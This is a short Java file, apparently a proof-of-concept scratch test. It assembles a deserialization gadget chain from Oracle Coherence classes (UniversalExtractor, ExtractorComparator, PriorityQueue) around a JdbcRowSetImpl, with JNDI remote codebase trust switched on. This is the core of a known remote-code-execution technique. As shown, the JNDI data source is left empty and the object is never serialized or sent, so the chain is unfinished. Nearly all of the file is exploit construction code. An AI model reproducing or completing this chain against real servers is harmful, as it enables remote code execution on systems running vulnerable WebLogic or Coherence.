import com.sun.rowset.JdbcRowSetImpl;
import com.tangosol.util.ClassFilter;
import com.tangosol.util.comparator.ExtractorComparator;
import com.tangosol.util.extractor.MultiExtractor;
import com.tangosol.util.extractor.ReflectionExtractor;
import com.tangosol.util.extractor.UniversalExtractor;
import pub.fuzz.utils.Reflections;

import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class test {
    public static void main(String arg[]) throws Exception {


        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");

        UniversalExtractor universalExtractor = new UniversalExtractor("getDatabaseMetaData()");
        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
        Class clazz1 = JdbcRowSetImpl.class.getSuperclass();
        Field dataSource = clazz1.getDeclaredField("dataSource");
        dataSource.setAccessible(true);
        dataSource.set(jdbcRowSet, "");
//        ChainedExtractor chainedExtractor1 = new ChainedExtractor(valueExtractors1);
        ExtractorComparator extractorComparator = new ExtractorComparator(universalExtractor);
//        Class extractorComparatorClass = ExtractorComparator.class;
//        Field m_extractor = extractorComparatorClass.getDeclaredField("m_extractor");
//        m_extractor.setAccessible(true);
//        m_extractor.set(extractorComparator,dataSource);

        PriorityQueue queue = new PriorityQueue(2);
        queue.add("1");
        queue.add("1");

        Class ext = PriorityQueue.class;
        Field comparator = ext.getDeclaredField("comparator");
        comparator.setAccessible(true);
        comparator.set(queue, extractorComparator);

        Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        queueArray[0] = jdbcRowSet;
    }
}
